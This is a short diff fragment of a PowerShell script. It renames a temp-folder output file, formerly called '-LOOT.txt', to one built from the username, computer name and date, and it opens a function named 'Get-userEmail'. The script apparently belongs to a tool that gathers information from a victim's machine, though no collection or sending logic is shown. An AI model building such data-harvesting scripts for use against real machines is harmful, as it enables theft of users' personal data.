@@ -1,4 +1,4 @@
-$FileName = "$env:tmp/$env:USERNAME-LOOT.txt"
+$FileName = "$env:tmp/$env:USERNAME-$env:COMPUTERNAME-$(Get-Date -f dd_hh-mm-MM-yyyy).txt"
 
 
 function Get-userEmail{
